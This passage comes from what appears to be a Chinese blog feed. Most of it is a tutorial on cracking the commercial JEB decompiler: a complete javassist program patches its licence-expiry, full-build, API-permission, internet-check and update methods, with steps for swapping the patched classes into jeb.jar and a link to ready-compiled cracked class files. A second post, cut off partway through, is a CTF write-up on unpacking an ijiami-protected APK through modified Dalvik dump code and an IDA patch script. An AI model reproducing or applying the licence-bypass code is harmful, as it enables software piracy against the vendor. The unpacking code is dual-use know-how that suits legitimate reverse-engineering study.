public static void Trace_exit()</div><div class="line">		&#123;</div><div class="line">			println( &quot;ret is :   &quot; );</div><div class="line">			println( &quot;[&quot; );</div><div class="line">			jstack();</div><div class="line">			println( &quot;]&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>经过各种翻看代码，调试， Hook, 终于找到一些可能是比较关键的函数，我们该怎么办呢？ 这时可以使用 <code>javassist</code> 来修改目标 方法。<br>比较懒，把破解 JEB 期间的所有代码都放到 一个 函数里面了，做了一定的注释。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div></pre></td><td class="code"><pre><div class="line">package me.hacklh;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.Launcher;</div><div class="line">import javassist.ClassPool;</div><div class="line">import javassist.CtClass;</div><div class="line">import javassist.CtMethod;</div><div class="line">import javassist.CtNewMethod;</div><div class="line">import com.pnfsoftware.jeb.installer.*;</div><div class="line">import org.eclipse.core.launcher.Main;</div><div class="line">import com.pnfsoftware.jeb.client.Licensing;</div><div class="line"></div><div class="line"></div><div class="line">public class JebCracker &#123;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line"></div><div class="line">//        com.pnfsoftware.jeb.installer.Launcher.main(new String[]&#123;&quot;--di&quot;&#125;);</div><div class="line">//        DES.main(args);</div><div class="line">         Launcher.main(new String[]&#123;&quot;--generate-key&quot;&#125;);</div><div class="line">        CtClass.debugDump = &quot;./debugDump/&quot;;</div><div class="line"></div><div class="line">        System.out.println(Licensing.allowAnyClient());</div><div class="line"></div><div class="line">//        Main.main(args);</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 修改安装时的校验, 避免去下载网络安装文件，直接使用我们事先下好的文件就行</div><div class="line">         */</div><div class="line">        ClassPool pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.installer&quot;);</div><div class="line">        CtClass old_class = pool.get(&quot;com.pnfsoftware.jeb.installer.Package&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        CtMethod old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;verifyData&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(byte[].class.getName()),</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line">        /**</div><div class="line">         * 修改getStatus， AbstractContext会起几个线程修改status</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getStatus&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return 0;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;terminate&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * internet 检测</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jebglobal.tB&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jebglobal.tB&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;dL&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(boolean.class.getName()),</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;run&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 增加许可证的过期时间</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.Licensing&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.client.Licensing&quot;);</div><div class="line">        old_class.detach();</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getExpirationTimestamp&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return real_license_ts + 345600000;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;isInternetRequired&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return false;&quot;);</div><div class="line"></div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;isFullBuild&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;canUseCoreAPI&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;canUseCoreAPI&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * patch 掉与网络下载有关的函数，禁止升级</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;downloadBinary&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;httpPost&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(long[].class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行后会在工程目录生成一个文件夹，以你修改的类名为目录结构。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823032290g5jxwh19.png?imageslim" alt="paste image"></p>
<p>把这些 class文件替换到来的 jar 包里面就可了。<br>可以使用 winrar 把 jar 包打开，找到对应目录，拖进去替换就行了。<br>替换之后要去 META-INF 删掉一些东西。具体看下图</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823340258i9tfkhxn.png?imageslim" alt="paste image"></p>
<p>这样就完成了jar包的修改。<br>最后说下静态分析jar包的工具，使用 JEB 就可以。首先把jar 转换为 dex.</p>
<hr>
<p>dx.bat –dex –output=d:\dst.dex src.jar</p>
<hr>
<p>然后拿起jeb分析就行了。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如果你看到了这里，并且按我前面所说的方式一步一步破解了jeb, 那么恭喜你和我一样被坑了。弄得差不多的时候，我发现有一个神奇的类。<br><code>com.pnfsoftware.jeb.client.Licensing</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823755460wqmsw9br.png?imageslim" alt="paste image"></p>
<p>瞬间爆炸，我们只要修改这里的函数的返回值，或者直接重写这个类，就可以基本搞定这款软件了。52破解上的  jeb 2.2.7 中延长使用时间 就是修改的这个类的方法（后面才看的，悲伤~~）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508823969930hxe2xs6n.png?imageslim" alt="paste image"></p>
<p>编译后 <a href="https://gitee.com/hac425/blog_data/blob/master/jeb_data.zip" target="_blank" rel="external">Class文件，点我</a> ，用它去替换jeb.jar中的相应文件即可,具体替换方法，文中有介绍。</p>
<p>分析过程的一些笔记<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">2.3.3</div><div class="line">com.pnfsoftware.jebglobal.cF  用于获取serial, uuid 生成字符串</div><div class="line">  .At---&gt; get uuid  </div><div class="line">  .GQ----&gt; get serial number   </div><div class="line">  .dL------&gt;     get_md5、</div><div class="line">com.pnfsoftware.jebglobal.eI  sC方法会检测运行时间，定时退出  校验运行时间  patch</div><div class="line">com.pnfsoftware.jeb.client.Licensing    licensing 校验   ， 修改该类的方法的返回值可以拿到大量的结果</div><div class="line">com.pnfsoftware.jebglobal.Wr                        重要函数，程序初始化， 保存功能</div></pre></td></tr></table></figure></p>
<p>分析过程中的另外的 Btrace脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">/* BTrace Script Template */  </div><div class="line">import com.sun.btrace.annotations.*;  </div><div class="line">import static com.sun.btrace.BTraceUtils.*;  </div><div class="line">/*  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.Wr&quot;, </div><div class="line">    method = &quot;saveProject&quot;)  </div><div class="line">   public static void traceExecute()&#123;  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.qI&quot;, </div><div class="line">    method = &quot;getKey&quot;,</div><div class="line">    location=@Location(Kind.RETURN)  </div><div class="line">  )  </div><div class="line">   public static void traceExecute(@Self com.pnfsoftware.jebglobal.qI object, @Return String result)&#123;  </div><div class="line">      println(strcat(&quot;ret: &quot;,str(result)));  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">@BTrace  </div><div class="line">public class TracingScript &#123;  </div><div class="line"></div><div class="line">  @OnMethod(  </div><div class="line">    clazz = &quot;com.pnfsoftware.jebglobal.GN&quot;, </div><div class="line">    method = &quot;dL&quot;,</div><div class="line">    location=@Location(Kind.RETURN)  </div><div class="line">  )  </div><div class="line">   public static void traceExecute(@Self com.pnfsoftware.jebglobal.GN object, byte[] var0, int var1, int var2, @Return String result)&#123;  </div><div class="line">      println(strcat(&quot;ret: &quot;,str(result)));  </div><div class="line">      jstack();  </div><div class="line">      println(strcat(&quot;--------------:--\n&quot;,&quot;********************\n&quot;));  </div><div class="line">   &#125;  </div><div class="line">  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> jeb破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jeb </tag>
            
            <tag> 破解 </tag>
            
            <tag> jar包调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【天翼杯安卓题二】 爱加密脱壳实战]]></title>
      <url>//%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/2017-10-22-aijiami-unpacker.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  这个apk使用爱加密加密，加密时间是2017.6月。这个题其实就是个脱壳题，脱完立马见flag。(出题人也太懒了)</p>
<p>题目链接：<a href="https://gitee.com/hac425/blog_data/blob/master/app02.apk" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/app02.apk</a></p>
<h3 id="壳介绍"><a href="#壳介绍" class="headerlink" title="壳介绍"></a>壳介绍</h3><p>爱加密的壳16年年底就已经开始通过 <code>hook dvmResolveClass</code> ，在调用具体方法时解密方法指令，然后将 DexFile结构体中的对应方法的 <code>md-&gt;insns</code> 指向 解密后的方法指令数据区，然后进入 <code>真正的dvmResolveClass</code>中执行指令，执行完后在重新加密指令，这样就可以防止 <code>dexhunter</code> 等工具在内存中 <code>dump dex</code> 文件。</p>
<p>流程图</p>
<p><img src="/img/android_sec/ijiami_flow.png" alt="流程图"></p>
<p><a href="http://www.cnblogs.com/2014asm/p/6534189.html" target="_blank" rel="external">图片来源</a> </p>
<h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>由上面可以知道，在<code>dvmResolveClass</code>函数执行的时候，代码是已经还原好了的。这时我们去<code>dump</code>相应的指令就是正确的指令。于是修改 <code>dvmResolveClass</code> 的代码，<code>dump</code> 方法的数据。<br>修改 <code>dvmResolveClass</code> 函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*  add dump .....*/   </div><div class="line">    </div><div class="line">  char key_str[20] = &quot;jiajiatest&quot;;</div><div class="line">  int fd=open(&quot;/data/local/tmp/resolve_class_config&quot;,O_RDONLY,0666);</div><div class="line">  if(fd!=-1)&#123;</div><div class="line">    int len = read(fd,key_str,19);</div><div class="line">    key_str[len-1] = &apos;\x00&apos;;</div><div class="line">    key_str[len] = &apos;\x00&apos;;</div><div class="line">    close(fd);</div><div class="line">  &#125;</div><div class="line">  ALOGI(&quot;The key_str ---&gt; %s----referrer-&gt;descriptor---&gt;%s--&quot;, key_str, referrer-&gt;descriptor);</div><div class="line">  </div><div class="line">if(strstr(referrer-&gt;descriptor, key_str))&#123;</div><div class="line">       char task_name[] = &quot;task_name&quot;;</div><div class="line">      char *logbuf = new char[1024];</div><div class="line">      char path[50] = &#123;0&#125;;</div><div class="line">      sprintf(path, &quot;/data/local/tmp/%s_dump_%d&quot;, key_str, getpid());</div><div class="line">      FILE *fpw = fopen(path, &quot;awb+&quot;);</div><div class="line">      for(int i=0; i &lt; referrer-&gt;directMethodCount; i++)&#123;</div><div class="line">        Method* md = &amp;referrer-&gt;directMethods[i];</div><div class="line">        const char* mName_d = md-&gt;name;</div><div class="line">        const u2 insSize_d = md-&gt;insSize;</div><div class="line">        const u2* insns_d = md-&gt;insns;</div><div class="line">        const u2 methodldx_d = md-&gt;methodIndex;</div><div class="line">        u4 insns_d_size = dvmGetMethodInsnsSize(md);</div><div class="line">// ALOGI(&quot;hacklh_md----&gt;%p, i--&gt;%d, directMethodCount--&gt;%d&quot;, md, i,referrer-&gt;directMethodCount);</div><div class="line">        sprintf(logbuf,&quot;-------------- (KL)resolving [class=%s, method=%s, methodIndex=%u, insSize=%u, insns_d=%x, codeSize=%d] in pid: %d(name: %s)&quot;,referrer-&gt;descriptor,mName_d,methodldx_d,insSize_d,(u4)insns_d, insns_d_size,getpid() , task_name);</div><div class="line">        LOGD(&quot;%s&quot;,logbuf);</div><div class="line">        if(fpw != NULL)&#123; </div><div class="line">          fwrite(logbuf,1,strlen(logbuf),fpw);</div><div class="line">          fflush(fpw);</div><div class="line">          fwrite((u1*)insns_d,1,insns_d_size*2, fpw);</div><div class="line">          fflush(fpw);</div><div class="line">        &#125;else&#123;</div><div class="line">          LOGD(&quot;——(KL)open %s fail!&quot;, path);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      for(int i=0; i &lt; referrer-&gt;virtualMethodCount; i++)&#123;</div><div class="line">        Method* mv = &amp;referrer-&gt;virtualMethods[i];</div><div class="line">        const char* mName_v = mv-&gt;name;</div><div class="line">        const u2 insSize_v = mv-&gt;insSize;</div><div class="line">        const u2* insns_v = mv-&gt;insns;</div><div class="line">        const u2 methodIdx_v = mv-&gt;methodIndex;</div><div class="line">        u4 insns_v_size = dvmGetMethodInsnsSize(mv);</div><div class="line">        sprintf(logbuf,&quot;-------------- (KL)resolving [class=%s, method=%s, methodIndex=%u, insSize=%u, insns_d=%x, codeSize=%d] in pid: %d(name: %s)&quot;,referrer-&gt;descriptor,mName_v,methodIdx_v,insSize_v,(u4)insns_v, insns_v_size,getpid() , task_name);</div><div class="line">        LOGD(&quot;%s&quot;,logbuf);</div><div class="line">        if(fpw != NULL)&#123;</div><div class="line">          fwrite(logbuf,1,strlen(logbuf),fpw);</div><div class="line">          fflush(fpw);</div><div class="line">          fwrite((u1*)insns_v,1,insns_v_size*2, fpw);</div><div class="line">          fflush(fpw);</div><div class="line">        &#125;else&#123;</div><div class="line">          LOGD(&quot;%s&quot;,&quot;——(KL)open file fail!&quot;);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      if(fpw != NULL)&#123;</div><div class="line">        fclose(fpw);</div><div class="line">      &#125;</div><div class="line">      delete logbuf;</div><div class="line">/*  add end .....*/</div></pre></td></tr></table></figure>
<p>dump之后我们需要把指令patch到dex对应位置上去，patch的方式有很多种，我选择使用ida脚本对他进行patch。我觉得ida就是一个各种文件格式的loader，我们可以在ida中修改文件的内容，然后可以让ida把修改应用到文件中，以完成patch。 因此在IDA中patch代码十分的方便，而且也很方便的查看patch后的结果。patch代码的流程是： </p>
<hr>
<p>读取dump的方法指令—&gt;定位相应方法指令数据区在ida中的位置—-&gt;patch</p>
<hr>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/python</div><div class="line"># -*- coding: utf8 -*-</div><div class="line"></div><div class="line"># 该脚本用于在ida中使用dump下来的method指令对 dex 进行Patch</div><div class="line">import re</div><div class="line">from dex_parser import dex</div><div class="line"></div><div class="line">#存储 存放dump数据的字典</div><div class="line">data_array = []</div><div class="line">#用来避免多次patch</div><div class="line">patched = []</div><div class="line">file_data = &quot;&quot;</div><div class="line"></div><div class="line">def parse_meta_data(data=&quot;&quot;):</div><div class="line">    # print data</div><div class="line">    ret = &#123;&#125;</div><div class="line">    tokens = re.findall(&quot;\[class=(.*?),.*?method=(.*?),.*?codeSize=(.*?)\]&quot;,data)</div><div class="line">    # print tokens</div><div class="line"></div><div class="line">    ret[&apos;class_name&apos;] = tokens[0][0][1:].replace(&apos;/&apos;,&apos;.&apos;).replace(&apos;;&apos;,&apos;&apos;)</div><div class="line">    ret[&apos;method&apos;] = tokens[0][1]</div><div class="line">    ret[&apos;code_size&apos;] = int(tokens[0][2]) * 2 #dex文件格式定义，总大小为 codeSize*2</div><div class="line">    # print ret</div><div class="line">    return ret</div><div class="line"></div><div class="line">#注释，用于给ida执行</div><div class="line"># def patch_byte(a, b):</div><div class="line">#     print hex(b),</div><div class="line"></div><div class="line">def patch(dest, src, size):</div><div class="line">    print &quot;dest::&#123;&#125;, src::&#123;&#125;, size::&#123;&#125;&quot;.format(dest, src, size)</div><div class="line">    for i in range(size):</div><div class="line">        patch_byte(dest + i, int(file_data[ src + i].encode(&apos;hex&apos;), 16))</div><div class="line"></div><div class="line">    print &quot;\n&quot;</div><div class="line"></div><div class="line">def parse_dump_data(filename):</div><div class="line">    global file_data</div><div class="line">    with open(filename, &quot;rb&quot;) as fp:</div><div class="line">        file_data = fp.read()</div><div class="line"></div><div class="line">    #使用正则表达式把说明dump数据的元数据加载到内存</div><div class="line">    all_item = re.findall(&quot;-------------- \(KL\)resolving(.*?) in pid:.*?\(name: task_name\)&quot;, file_data)</div><div class="line">    offset = 0</div><div class="line">    for meta_data in all_item:</div><div class="line">        try:</div><div class="line">            #使用字典组织数据</div><div class="line">            #&#123;&apos;class_name&apos;: &apos;com.example.jiajiatest.MainActivity&apos;, &apos;code_size&apos;: 306, &apos;method&apos;: &apos;add&apos;, &apos;data_offset&apos;: 7175&#125;</div><div class="line"></div><div class="line">            ret = parse_meta_data(meta_data)</div><div class="line">            data_addr = file_data.find(&apos;(name: task_name)&apos;, offset) + 17</div><div class="line">            ret[&apos;data_offset&apos;] = data_addr</div><div class="line">            data_array.append(ret)</div><div class="line">            offset = data_addr</div><div class="line">        except Exception as e:</div><div class="line">            raise e</div><div class="line"></div><div class="line">    return data_array</div><div class="line"></div><div class="line">def get_method_addr(method_data, signature_str):</div><div class="line">    for md_name in method_data:</div><div class="line">        if signature_str in md_name:</div><div class="line">            return method_data[md_name]</div><div class="line">    return -1</div><div class="line"></div><div class="line">def patch_dex(dump_data_file, dex_file):</div><div class="line">    dump_data = parse_dump_data(dump_data_file)</div><div class="line">    dex_obj = dex.dex_parser(dex_file)</div><div class="line">    method_data = dex_obj.get_class_data()</div><div class="line"></div><div class="line">    for item in dump_data:</div><div class="line">        signature_str = &quot;&#123;&#125;::&#123;&#125;&quot;.format(item[&apos;class_name&apos;], item[&apos;method&apos;])</div><div class="line">        if  signature_str not in 